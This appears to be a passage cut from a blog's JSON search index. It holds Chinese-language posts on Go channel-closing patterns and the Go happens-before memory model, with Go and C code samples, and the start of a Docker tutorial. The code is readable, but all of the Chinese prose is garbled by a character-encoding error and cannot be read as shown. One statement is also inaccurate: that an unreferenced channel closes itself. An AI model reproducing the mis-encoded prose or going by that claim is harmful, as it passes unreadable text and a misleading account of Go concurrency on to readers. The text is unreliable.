stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\n\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase dataCh <- rand.Intn(MaxRandomNumber):\n\t\t\t\t}\n\t\t\t}\n\t\t}()\n\t}\n\t\n\t// ä¸€ä¸ªæ¶ˆè´¹è€…\n\tgo func() {\n\t\tdefer wgReceivers.Done()\n\t\t\n\t\tfor value := range dataCh {\n\t\t\tif value == MaxRandomNumber-1 {\n\t\t\t\t\n\t\t\t\t// è¿™é‡Œå³æ˜¯dataCh çš„æ¶ˆè´¹è€…, ä¹Ÿæ˜¯ stopCh çš„ç”Ÿäº§è€…\n\t\t\t\tclose(stopCh)\n\t\t\t\treturn\n\t\t\t}\n\t\t\t\n\t\t\tlog.Println(value)\n\t\t}\n\t}()\n\t\n\t\n\twgReceivers.Wait()\n}\n```\n\n\n\nå°±ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼Œç”Ÿäº§è€…åŒæ—¶ä¹Ÿæ˜¯é€€å‡ºä¿¡å·channelçš„æ¥å—è€…ï¼Œé€€å‡ºä¿¡å·channelä»ç„¶æ˜¯ç”±å®ƒçš„ç”Ÿäº§ç«¯å…³é—­çš„ï¼Œæ‰€ä»¥è¿™ä»ç„¶æ²¡æœ‰è¿èƒŒ**channelå…³é—­åŸåˆ™**ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªä¾‹å­ä¸­ç”Ÿäº§ç«¯å’Œæ¥å—ç«¯éƒ½æ²¡æœ‰å…³é—­æ¶ˆæ¯æ•°æ®çš„channelï¼Œchannelåœ¨æ²¡æœ‰ä»»ä½•goroutineå¼•ç”¨çš„æ—¶å€™ä¼šè‡ªè¡Œå…³é—­ï¼Œè€Œä¸éœ€è¦æ˜¾ç¤ºè¿›è¡Œå…³é—­ã€‚\n\n \n\n####  å¤šä¸ªç”Ÿäº§è€…ï¼Œå¤šä¸ªæ¶ˆè´¹è€…\n\n \n\nè¿™æ˜¯æœ€å¤æ‚çš„ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬æ—¢ä¸èƒ½è®©æ¥å—ç«¯ä¹Ÿä¸èƒ½è®©å‘é€ç«¯å…³é—­channelã€‚æˆ‘ä»¬ç”šè‡³éƒ½ä¸èƒ½è®©æ¥å—è€…å…³é—­ä¸€ä¸ªé€€å‡ºä¿¡å·æ¥é€šçŸ¥ç”Ÿäº§è€…åœæ­¢ç”Ÿäº§ã€‚å› ä¸ºæˆ‘ä»¬ä¸èƒ½è¿å**channelå…³é—­åŸåˆ™**ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¼•å…¥ä¸€ä¸ªé¢å¤–çš„åè°ƒè€…æ¥å…³é—­é™„åŠ çš„é€€å‡ºä¿¡å·channelã€‚  \n\n \n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n\t\"strconv\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumReceivers = 10\n\tconst NumSenders = 1000\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(NumReceivers)\n\t\n\t\n\tdataCh := make(chan int, 100)\n\tstopCh := make(chan struct{}) //ç”Ÿäº§è€…æ˜¯ä¸»æŒäºº, æ¶ˆè´¹è€…æ˜¯ (dataChæ‰€æœ‰ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…)\n\t\n\ttoStop := make(chan string, 1) //ä½œç”¨æ˜¯é€šçŸ¥ä¸»æŒäººå»å…³é—­stopCh, ç”Ÿäº§è€…æ˜¯ (dataChæ‰€æœ‰ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…) æ¶ˆè´¹è€…æ˜¯ä¸»æŒäºº\n\t\t\n\t\n\tvar stoppedBy string\n\t\n\t// ä¸»æŒäºº\n\tgo func() {\n\t\tstoppedBy = <- toStop\n\t\tclose(stopCh)\n\t}()\n\t\n\t// å¤šä¸ªç”Ÿäº§è€…\n\tfor i := 0; i < NumSenders; i++ {\n\t\tgo func(id string) {\n\t\t\tfor {\n\t\t\t\tvalue := rand.Intn(MaxRandomNumber)\n\t\t\t\tif value == 0 {\n\t\t\t\t\t//é€šçŸ¥ä¸»æŒäººå»å¹²å…³é—­çš„æ´»\n\t\t\t\t\tselect {\n\t\t\t\t\tcase toStop <- \"sender#\" + id:\n\t\t\t\t\tdefault:\n\t\t\t\t\t}\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n                //å°è¯•å°½æ—©é€€å‡º, è¿™é‡Œä¸èƒ½çœç•¥, å› ä¸ºå¯èƒ½ä¼šå¯¼è‡´å¤šå‘é€ä¸€æ¬¡\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\t\n\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase dataCh <- value:\n\t\t\t\t}\n\t\t\t}\n\t\t}(strconv.Itoa(i))\n\t}\n\t\n\t// å¤šä¸ªæ¶ˆè´¹è€…\n\tfor i := 0; i < NumReceivers; i++ {\n\t\tgo func(id string) {\n\t\t\tdefer wgReceivers.Done()\n\t\t\t\n\t\t\tfor {\n\t\t\t\t//å°è¯•å°½æ—©é€€å‡º, è¿™é‡Œä¸èƒ½çœç•¥, å› ä¸ºå¯èƒ½ä¼šå¯¼è‡´å¤šæ¥æ”¶ä¸€æ¬¡\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n\t\t\t\t//æ³¨æ„æ­¤å¤„å¦‚æœ stopCh å…³é—­äº†, ä¸‹é¢ä¹Ÿæœ‰èƒ½ return ä¸äº†\n                //å› ä¸ºdataChä¹Ÿæœ‰å¯èƒ½select åˆ°, æ‰€ä»¥ä¸Šä¸€ä¸ª selectè¯­å¥ä¸èƒ½çœç•¥\n                \n                \n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase value := <-dataCh:\n\t\t\t\t\tif value == MaxRandomNumber-1 {\n\t\t\t\t\t\t//é€šçŸ¥ä¸»æŒäººå»å¹²å…³é—­çš„æ´»\n\t\t\t\t\t\tselect {\n\t\t\t\t\t\tcase toStop <- \"receiver#\" + id:\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tlog.Println(value)\n\t\t\t\t}\n\t\t\t}\n\t\t}(strconv.Itoa(i))\n\t}\n\t\n\t\n\twgReceivers.Wait()\n\tlog.Println(\"stopped by\", stoppedBy)\n}\n```\n\n\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä»ç„¶éµå®ˆç€*channel closing principle*ã€‚ è¯·æ³¨æ„channelÂ `toStop`çš„ç¼“å†²å¤§å°æ˜¯1.è¿™æ˜¯ä¸ºäº†é¿å…å½“mederator goroutine å‡†å¤‡å¥½ä¹‹å‰ç¬¬ä¸€ä¸ªé€šçŸ¥å°±å·²ç»å‘é€äº†ï¼Œå¯¼è‡´ä¸¢å¤±ã€‚\n\n\n\n#### **ç»“è®º**\n\næ²¡æœ‰ä»»ä½•åœºæ™¯å€¼å¾—ä½ å»æ‰“ç ´channelå…³é—­åŸåˆ™ï¼Œå¦‚æœä½ é‡åˆ°è¿™æ ·çš„ä¸€ç§ç‰¹æ®Šåœºæ™¯ï¼Œè¿˜æ˜¯å»ºè®®ä½ å¥½å¥½æ€è€ƒä¸€ä¸‹è‡ªå·±è®¾è®¡ï¼Œæ˜¯ä¸æ˜¯è¯¥é‡æ„ä¸€ä¸‹äº†ã€‚\n\n\n\n\n\n#### [ä¸ªäººç–‘é—®è§£ç­”](https://www.jianshu.com/p/d24dfbb33781)\n\næ¥¼ä¸»ä½ å¥½, å…³äºç¬¬ä¸‰ä¸ªä¾‹å­æœ‰äº›é—®é¢˜è¯·æ•™\n\n1. value==0æ—¶, ä¸ºä»€ä¹ˆè¿˜è¦åŠ ä¸ªselect, ä¸èƒ½ç›´æ¥å‘é€ç»™toStopå—?\n\n```\nif value == 0 {\nselect {\ncase toStop <- \"sender#\" + id:\ndefault:\n}\nreturn\n}\n```\n> å› ä¸ºå¯èƒ½å¤šä¸ªç”Ÿäº§è€…æˆ–è€…å¤šä¸ªæ¶ˆè´¹è€…æ»¡è¶³æ¡ä»¶, é˜²æ­¢é˜»å¡\n\n\n\n2. select stopCh ä¸ºä»€ä¹ˆå†™äº†ä¸¤æ¬¡? ç¬¬ä¸€ä¸ªselectå¯ä»¥çœç•¥å—?\n\n```\nselect {\ncase <- stopCh:\n\treturn\ndefault:\n}\n\nselect {\ncase <- stopCh:\n\treturn\ncase dataCh <- value:\n}\n```\n> ä¸ºäº†å°½æ—©é€€å‡º, å› ä¸ºç¬¬äºŒä¸ª Selectæœ‰å¯èƒ½ select åˆ°dataCh, è™½ç„¶å·²ç»é€šçŸ¥å…³é—­äº†\n\n\n\n3. toStopçš„ç¼“å†²å¤§å°æ˜¯1, ä¸ºäº†é¿å…å‡†å¤‡å¥½ä¹‹å‰é€šçŸ¥å°±å‘é€äº†æ€ä¹ˆç†è§£??\n\n   è¯·æ³¨æ„channel toStopçš„ç¼“å†²å¤§å°æ˜¯1.è¿™æ˜¯ä¸ºäº†é¿å…å½“mederator goroutine å‡†å¤‡å¥½ä¹‹å‰ç¬¬ä¸€ä¸ªé€šçŸ¥å°±å·²ç»å‘é€äº†ï¼Œå¯¼è‡´ä¸¢å¤±ã€‚\n\n> å› ä¸ºæœ‰ç¼“å†²çš„ å‘é€ happens_before æ¥æ”¶ä¹‹å‰, æ‰€ä»¥mederatorèƒ½ä¿è¯æ¥æ”¶åˆ°æ•°æ®\n>\n> æ— ç¼“å†²çš„ æ¥æ”¶ happens_before å‘é€ä¹‹é—´,  å¯èƒ½ä¼šä¸¢å¤±æ•°æ®","tags":["golang"],"categories":["golang"]},{"title":"golangå†…å­˜æ¨¡å‹å’Œhappens_before","url":"%2Fp%2F6196d525.html","content":"\n\n\n### happens-before æœ¯è¯­\n\nhappens-beforeæ˜¯ä¸€ä¸ªæœ¯è¯­ï¼Œå¹¶ä¸ä»…ä»…æ˜¯Goè¯­è¨€æ‰æœ‰çš„ã€‚ç®€å•çš„è¯´ï¼Œé€šå¸¸çš„å®šä¹‰å¦‚ä¸‹ï¼š\n\nå‡è®¾Aå’ŒBè¡¨ç¤ºä¸€ä¸ªå¤šçº¿ç¨‹çš„ç¨‹åºæ‰§è¡Œçš„ä¸¤ä¸ªæ“ä½œã€‚å¦‚æœA happens-before Bï¼Œé‚£ä¹ˆAæ“ä½œå¯¹å†…å­˜çš„å½±å“ å°†å¯¹æ‰§è¡ŒBçš„çº¿ç¨‹(ä¸”æ‰§è¡ŒBä¹‹å‰)å¯è§ã€‚ \n\n\n\n+ æ— è®ºä½¿ç”¨å“ªç§ç¼–ç¨‹è¯­è¨€ï¼Œæœ‰ä¸€ç‚¹æ˜¯ç›¸åŒçš„ï¼šå¦‚æœæ“ä½œAå’ŒBåœ¨ç›¸åŒçš„çº¿ç¨‹ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”Aæ“ä½œçš„å£°æ˜åœ¨Bä¹‹å‰ï¼Œé‚£ä¹ˆA happens-before Bã€‚\n\n```\nint A, B;\nvoid foo()\n{\n  // This store to A ...\n  A = 5;\n  // ... effectively becomes visible before the following loads. Duh!\n  B = A * A;\n}\n```\n\n \n\n+ è¿˜æœ‰ä¸€ç‚¹æ˜¯ï¼Œåœ¨æ¯é—¨è¯­è¨€ä¸­ï¼Œæ— è®ºä½ ä½¿ç”¨é‚£ç§æ–¹å¼è·å¾—ï¼Œhappens-beforeå…³ç³»éƒ½æ˜¯å¯ä¼ é€’çš„ï¼šå¦‚æœA happens-before Bï¼ŒåŒæ—¶B happens-before Cï¼Œé‚£ä¹ˆA happens-before Cã€‚å½“è¿™äº›å…³ç³»å‘ç”Ÿåœ¨ä¸åŒçš„çº¿ç¨‹ä¸­ï¼Œä¼ é€’æ€§å°†å˜å¾—éå¸¸æœ‰ç”¨ã€‚\n\n<!-- more -->\n\n\n\nåˆšæ¥è§¦è¿™ä¸ªæœ¯è¯­çš„äººæ€»æ˜¯å®¹æ˜“è¯¯è§£ï¼Œè¿™é‡Œå¿…é¡»æ¾„æ¸…çš„æ˜¯ï¼Œhappens-beforeå¹¶ä¸æ˜¯æŒ‡æ—¶åºå…³ç³»ï¼Œå¹¶ä¸æ˜¯è¯´A happens-before Bå°±è¡¨ç¤ºæ“ä½œAåœ¨æ“ä½œBä¹‹å‰å‘ç”Ÿã€‚å®ƒå°±æ˜¯ä¸€ä¸ªæœ¯è¯­ï¼Œå°±åƒå…‰å¹´ä¸æ˜¯æ—¶é—´å•ä½ä¸€æ ·ã€‚å…·ä½“åœ°è¯´ï¼š\n\n1.  **A happens-before Bå¹¶ä¸æ„å‘³ç€Aåœ¨Bä¹‹å‰å‘ç”Ÿã€‚**\n2.  **Aåœ¨Bä¹‹å‰å‘ç”Ÿå¹¶ä¸æ„å‘³ç€A happens-before Bã€‚**\n\nè¿™ä¸¤ä¸ªé™ˆè¿°çœ‹ä¼¼çŸ›ç›¾ï¼Œå…¶å®å¹¶ä¸æ˜¯ã€‚å¦‚æœä½ è§‰å¾—å¾ˆå›°æƒ‘ï¼Œå¯ä»¥å¤šè¯»å‡ ç¯‡å®ƒçš„å®šä¹‰ã€‚åé¢æˆ‘ä¼šè¯•ç€è§£é‡Šè¿™ç‚¹ã€‚è®°ä½ï¼Œhappens-before æ˜¯ä¸€ç³»åˆ—è¯­è¨€è§„èŒƒä¸­å®šä¹‰çš„æ“ä½œé—´çš„å…³ç³»ã€‚å®ƒå’Œæ—¶é—´çš„æ¦‚å¿µç‹¬ç«‹ã€‚è¿™å’Œæˆ‘ä»¬é€šå¸¸è¯´â€Aåœ¨Bä¹‹å‰å‘ç”Ÿâ€æ—¶è¡¨è¾¾çš„çœŸå®ä¸–ç•Œä¸­äº‹ä»¶çš„æ—¶é—´é¡ºåºä¸åŒã€‚\n\n\n\n### A happens-before Bå¹¶ä¸æ„å‘³ç€Aåœ¨Bä¹‹å‰å‘ç”Ÿ (ç¼–è¯‘å™¨å¯èƒ½ä¼šé‡æ’)\n\n\n\nè¿™é‡Œæœ‰ä¸ªä¾‹å­ï¼Œå…¶ä¸­çš„æ“ä½œå…·æœ‰happens-beforeå…³ç³»ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶ä¸ä¸€å®šæ˜¯æŒ‰ç…§é‚£ä¸ªé¡ºåºå‘ç”Ÿçš„ã€‚ä¸‹é¢çš„ä»£ç æ‰§è¡Œäº†(1)å¯¹Açš„èµ‹å€¼ï¼Œç´§æ¥ç€æ˜¯(2)å¯¹Bçš„èµ‹å€¼ã€‚\n\n```\nint A = 0;\nint B = 0;\nvoid main()\n{\n    A = B + 1; // (1)\n    B = 1; // (2)\n}\n```\n\n\n\næ ¹æ®å‰é¢è¯´æ˜çš„è§„åˆ™ï¼Œ(1) happens-before (2)ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨gcc -O2ç¼–è¯‘è¿™ä¸ªä»£ç ï¼Œç¼–è¯‘å™¨å°†äº§ç”Ÿä¸€äº›æŒ‡ä»¤é‡æ’åºã€‚æœ‰å¯èƒ½æ‰§è¡Œé¡ºåºæ˜¯è¿™æ ·å­çš„ï¼š\n\n```\nå°†Bçš„å€¼å–åˆ°å¯„å­˜å™¨\nå°†Bèµ‹å€¼ä¸º1\nå°†å¯„å­˜å™¨å€¼åŠ 1åèµ‹å€¼ç»™A\n```\n\nä¹Ÿå°±æ˜¯åˆ°ç¬¬äºŒæ¡æœºå™¨æŒ‡ä»¤(å¯¹Bçš„èµ‹å€¼)å®Œæˆæ—¶ï¼Œå¯¹Açš„èµ‹å€¼è¿˜æ²¡æœ‰å®Œæˆã€‚æ¢å¥è¯è¯´ï¼Œ(1)å¹¶æ²¡æœ‰åœ¨(2)ä¹‹å‰å‘ç”Ÿ!\n\né‚£ä¹ˆï¼Œè¿™é‡Œè¿åäº†happens-beforeå…³ç³»äº†å—ï¼Ÿè®©æˆ‘ä»¬æ¥åˆ†æä¸‹ï¼Œæ ¹æ®å®šä¹‰ï¼Œæ“ä½œ(1)å¯¹å†…å­˜çš„å½±å“å¿…é¡»åœ¨æ“ä½œ(2)æ‰§è¡Œä¹‹å‰å¯¹å…¶å¯è§ã€‚æ¢å¥è¯è¯´ï¼Œå¯¹Açš„èµ‹å€¼å¿…é¡»æœ‰æœºä¼šå¯¹Bçš„èµ‹å€¼æœ‰å½±å“.\n\nä½†æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¯¹Açš„èµ‹å€¼å…¶å®å¹¶æ²¡æœ‰å¯¹Bçš„èµ‹å€¼æœ‰å½±å“ã€‚å³ä¾¿(1)çš„å½±å“çœŸçš„å¯è§ï¼Œ(2)çš„è¡Œä¸ºè¿˜æ˜¯ä¸€æ ·ã€‚æ‰€ä»¥ï¼Œè¿™å¹¶ä¸èƒ½ç®—æ˜¯è¿èƒŒhappens-beforeè§„åˆ™ã€‚\n\n\n\n### Aåœ¨Bä¹‹å‰å‘ç”Ÿå¹¶ä¸æ„å‘³ç€A happens-before B (è™½ç„¶åœ¨ä¹‹å‰å‘ç”Ÿä½†ä¸æ»¡è¶³è§„åˆ™)\n\nä¸‹é¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ‰€æœ‰çš„æ“ä½œæŒ‰ç…§æŒ‡å®šçš„é¡ºåºå‘ç”Ÿï¼Œä½†æ˜¯å¹¶èƒ½ä¸æ„æˆhappens-before å…³ç³»ã€‚å‡è®¾ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨pulishMessageï¼ŒåŒæ—¶ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨consumeMessageã€‚ ç”±äºæˆ‘ä»¬å¹¶è¡Œçš„æ“ä½œå…±äº«å˜é‡ï¼Œä¸ºäº†ç®€å•ï¼Œæˆ‘ä»¬å‡è®¾æ‰€æœ‰å¯¹intç±»å‹çš„å˜é‡çš„æ“ä½œéƒ½æ˜¯åŸå­çš„ã€‚\n\n\n\n```\nint isReady = 0;\nint answer = 0;\nvoid publishMessage()\n{\n  answer = 42; // (1)\n  isReady = 1; // (2)\n}\nvoid consumeMessage()\n{\n  if (isReady)\t\t\t    // (3) <-- Let's suppose this line reads 1\n  \tprintf(\"%d\\n\", answer); // (4)\n}\n```\n\n\n\næ ¹æ®ç¨‹åºçš„é¡ºåºï¼Œåœ¨(1)å’Œ(2)ä¹‹é—´å­˜åœ¨happens-before å…³ç³»ï¼ŒåŒæ—¶åœ¨(3)å’Œ(4)ä¹‹é—´ä¹Ÿå­˜åœ¨happens-beforeå…³ç³»ã€‚\n\n\n\né™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬å‡è®¾åœ¨è¿è¡Œæ—¶ï¼ŒisReadyè¯»åˆ°1(æ˜¯ç”±å¦ä¸€ä¸ªçº¿ç¨‹åœ¨(2)ä¸­èµ‹çš„å€¼)ã€‚åœ¨è¿™ä¸­æƒ…å½¢ä¸‹ï¼Œæˆ‘ä»¬å¯çŸ¥(2)ä¸€å®šåœ¨(3)ä¹‹å‰å‘ç”Ÿã€‚ä½†æ˜¯è¿™å¹¶ä¸æ„å‘³ç€åœ¨(2)å’Œ(3)ä¹‹é—´å­˜åœ¨happens-before å…³ç³»!\n\nhappens-before å…³ç³»åªåœ¨è¯­è¨€æ ‡å‡†ä¸­å®šä¹‰çš„åœ°æ–¹å­˜åœ¨ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰ç›¸å…³çš„è§„åˆ™è¯´æ˜(2)å’Œ(3)ä¹‹é—´å­˜åœ¨happens-beforeå…³ç³»ï¼Œå³ä¾¿(3)è¯»åˆ°äº†(2)èµ‹çš„å€¼ã€‚\n\nè¿˜æœ‰ï¼Œç”±äº(2)å’Œ(3)ä¹‹é—´ï¼Œ(1)å’Œ(4)ä¹‹é—´éƒ½ä¸å­˜åœ¨happens-beforeå…³ç³»ï¼Œé‚£ä¹ˆ(1)å’Œ(4)çš„å†…å­˜äº¤äº’ä¹Ÿå¯èƒ½è¢«é‡æ’åº (è¦ä¸ç„¶æ¥è‡ªç¼–è¯‘å™¨çš„æŒ‡ä»¤é‡æ’åºï¼Œè¦ä¸ç„¶æ¥è‡ªå¤„ç†å™¨è‡ªèº«çš„å†…å­˜é‡æ’åº)ã€‚é‚£æ ·çš„è¯ï¼Œå³ä½¿(3)è¯»åˆ°1ï¼Œ(4)ä¹Ÿä¼šæ‰“å°å‡ºâ€œ0â€œã€‚\n\n \n\n### Goå…³äºåŒæ­¥çš„è§„åˆ™ (å¾€å†°ç®±æ”¾è¥¿ç“œ, å…ˆæ”¾åæ‹¿,å¾€æ‰‹é‡Œé€’è¥¿ç“œ, å…ˆæ¥åæ”¾)\n\n\n\nå…³äºchannelçš„happens-beforeåœ¨Goçš„å†…å­˜æ¨¡å‹ä¸­æåˆ°äº†ä¸‰ç§æƒ…å†µï¼š\n\n- å¯¹ä¸€ä¸ªchannelçš„å‘é€æ“ä½œ happens-before ç›¸åº”channelçš„æ¥æ”¶æ“ä½œå®Œæˆ     \t  **(å¾€å†°ç®±æ”¾è¥¿ç“œ, å…ˆæ”¾åæ‹¿)**\n- å…³é—­ä¸€ä¸ªchannel happens-before ä»è¯¥Channelæ¥æ”¶åˆ°æœ€åçš„è¿”å›å€¼0                \n\n- ä¸å¸¦ç¼“å†²çš„channelçš„æ¥æ”¶æ“ä½œ happens-before ç›¸åº”channelçš„å‘é€æ“ä½œå®Œæˆ      **(å¾€æ‰‹é‡Œé€’è¥¿ç“œ, å…ˆæ¥åæ”¾) **     \n\n\n\nå…ˆçœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š\n\n```\nvar c = make(chan int, 10)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    c <- 0  // (2)\n}\nfunc main() {\n    go f()\n    <-c   // (3)\n    print(a)  // (4)\n}\n```\n\nä¸Šè¿°ä»£ç å¯ä»¥ç¡®ä¿è¾“å‡º\"hello, world\"ï¼Œå› ä¸º(1) happens-before (2)ï¼Œ(4) happens-after (3)ï¼Œå†æ ¹æ®ä¸Šé¢çš„ç¬¬ä¸€æ¡è§„åˆ™(2)æ˜¯ happens-before (3)çš„ï¼Œæœ€åæ ¹æ®happens-beforeçš„å¯ä¼ é€’æ€§ï¼Œäºæ˜¯æœ‰(1) happens-before (4)ï¼Œä¹Ÿå°±æ˜¯a = \"hello, world\" happens-before print(a)ã€‚\n\n\n\nå†çœ‹å¦ä¸€ä¸ªä¾‹å­ï¼š\n\n```\nvar c = make(chan int)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    <-c   // (2)\n}\nfunc main() {\n    go f()\n    c <- 0  // (3)\n    print(a)  // (4)\n}\n```\n\næ ¹æ®ä¸Šé¢çš„ç¬¬ä¸‰æ¡è§„åˆ™(2) happens-before (3)ï¼Œæœ€ç»ˆå¯ä»¥ä¿è¯(1) happens-before (4)ã€‚\n\n\n\n\n\nå¦‚æœæˆ‘æŠŠä¸Šé¢çš„ä»£ç ç¨å¾®æ”¹ä¸€ç‚¹ç‚¹ï¼Œå°†cå˜ä¸ºä¸€ä¸ªå¸¦ç¼“å­˜çš„channelï¼Œåˆ™print(a)æ‰“å°çš„ç»“æœä¸èƒ½å¤Ÿä¿è¯æ˜¯\"hello world\"ã€‚\n\n```\nvar c = make(chan int, 1)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    <-c   // (2)\n}\nfunc main() {\n    go f()\n    c <- 0  // (3)\n    print(a)  // (4)\n}\n```\n\nå› ä¸ºè¿™é‡Œä¸å†æœ‰ä»»ä½•åŒæ­¥ä¿è¯ï¼Œä½¿å¾—(2) happens-before (3)ã€‚å¯ä»¥å›å¤´åˆ†æä¸€ä¸‹æœ¬èŠ‚æœ€å‰é¢çš„ä¾‹å­ï¼Œä¹Ÿæ˜¯æ²¡æœ‰ä¿è¯happens-beforeæ¡ä»¶ã€‚\n\n\n\n\n\n### golang happen before çš„ä¿è¯\n\n\n\n**1) å•çº¿ç¨‹**\n\n\n\n**2) Init å‡½æ•°**\n\n- å¦‚æœåŒ…P1ä¸­å¯¼å…¥äº†åŒ…P2ï¼Œåˆ™P2ä¸­çš„initå‡½æ•°Happens Before æ‰€æœ‰P1ä¸­çš„æ“ä½œ\n- mainå‡½æ•°Happens After æ‰€æœ‰çš„initå‡½æ•°\n\n\n\n3) **Goroutine**\n\n- Goroutineçš„åˆ›å»ºHappens Beforeæ‰€æœ‰æ­¤Goroutineä¸­çš„æ“ä½œ\n- Goroutineçš„é”€æ¯Happens Afteræ‰€æœ‰æ­¤Goroutineä¸­çš„æ“ä½œ\n\n\n\n **4) Channel**\n\n- å¯¹ä¸€ä¸ªå…ƒç´ çš„sendæ“ä½œHappens Beforeå¯¹åº”çš„receive å®Œæˆæ“ä½œ\n- å¯¹channelçš„closeæ“ä½œHappens Before receive ç«¯çš„æ”¶åˆ°å…³é—­é€šçŸ¥æ“ä½œ\n- å¯¹äºUnbuffered Channelï¼Œå¯¹ä¸€ä¸ªå…ƒç´ çš„receive æ“ä½œHappens Beforeå¯¹åº”çš„sendå®Œæˆæ“ä½œ\n- å¯¹äºBuffered Channelï¼Œå‡è®¾Channel çš„buffer å¤§å°ä¸ºCï¼Œé‚£ä¹ˆå¯¹ç¬¬kä¸ªå…ƒç´ çš„receiveæ“ä½œï¼ŒHappens Beforeç¬¬k+Cä¸ªsendå®Œæˆæ“ä½œã€‚å¯ä»¥çœ‹å‡ºä¸Šä¸€æ¡Unbuffered Channelè§„åˆ™å°±æ˜¯è¿™æ¡è§„åˆ™C=0æ—¶çš„ç‰¹ä¾‹\n\n\n\n**5) Lock**\n\nGoé‡Œé¢æœ‰Mutexå’ŒRWMutexä¸¤ç§é”ï¼ŒRWMutexé™¤äº†æ”¯æŒäº’æ–¥çš„Lock/Unlockï¼Œè¿˜æ”¯æŒå…±äº«çš„RLock/RUnlockã€‚\n\n- å¯¹äºä¸€ä¸ªMutex/RWMutexï¼Œè®¾n < mï¼Œåˆ™ç¬¬nä¸ªUnlockæ“ä½œHappens Beforeç¬¬mä¸ªLockæ“ä½œã€‚\n- å¯¹äºä¸€ä¸ªRWMutexï¼Œå­˜åœ¨æ•°å€¼nï¼ŒRLockæ“ä½œHappens After ç¬¬nä¸ªUnLockï¼Œå…¶å¯¹åº”çš„RUnLock Happens Before ç¬¬n+1ä¸ªLockæ“ä½œã€‚\n\n*ç®€å•ç†è§£å°±æ˜¯è¿™ä¸€æ¬¡çš„Lockæ€»æ˜¯Happens Afterä¸Šä¸€æ¬¡çš„Unlockï¼Œè¯»å†™é”çš„RLock HappensAfterä¸Šä¸€æ¬¡çš„UnLockï¼Œå…¶å¯¹åº”çš„RUnlock Happens Before ä¸‹ä¸€æ¬¡çš„Lockã€‚*\n\n```\nvar l sync.Mutex\nvar a string\nfunc f() {\n    a = \"hello, world\" // (1)\n    l.Unlock() // (2)\n}\nfunc main() {\n    l.Lock() // (3)\n    go f()\n    l.Lock() // (4)\n    print(a) // (5)\n}\n```\n\n(1) happens-before (2) happens-before (4) happens-before (5)\n\n\n\n**6) Once**\n\nonce.Doä¸­æ‰§è¡Œçš„æ“ä½œï¼ŒHappens Before ä»»ä½•ä¸€ä¸ªonce.Doè°ƒç”¨çš„è¿”å›ã€‚","tags":["golang"],"categories":["golang"]},{"title":"dockeråŸºç¡€å…¥é—¨æ•™ç¨‹","url":"%2Fp%2Fa12c5ca5.html","content":"\n\n\n# 0. åŸºæœ¬æ¦‚å¿µ\n\n+ é•œåƒ\n\né•œåƒåŒ…å«æ“ä½œç³»ç»Ÿå®Œæ•´çš„Â `root`Â æ–‡ä»¶ç³»ç»Ÿï¼Œå…¶ä½“ç§¯å¾€å¾€æ˜¯åºå¤§çš„ï¼Œå› æ­¤åœ¨ Docker è®¾è®¡æ—¶ï¼Œå°±å……åˆ†åˆ©ç”¨ Union FS çš„æŠ€æœ¯ï¼Œå°†å…¶è®¾è®¡ä¸ºåˆ†å±‚å­˜å‚¨çš„æ¶æ„ã€‚æ‰€ä»¥ä¸¥æ ¼æ¥è¯´ï¼Œé•œåƒå¹¶éæ˜¯åƒä¸€ä¸ª ISO é‚£æ ·çš„æ‰“åŒ…æ–‡ä»¶ï¼Œé•œåƒåªæ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„æ¦‚å¿µï¼Œå…¶å®é™…ä½“ç°å¹¶éç”±ä¸€ä¸ªæ–‡ä»¶ç»„æˆï¼Œè€Œæ˜¯ç”±ä¸€ç»„æ–‡ä»¶ç³»ç»Ÿç»„æˆï¼Œæˆ–è€…è¯´ï¼Œç”±å¤šå±‚æ–‡ä»¶ç³»ç»Ÿè”åˆç»„æˆã€‚\n\n+ 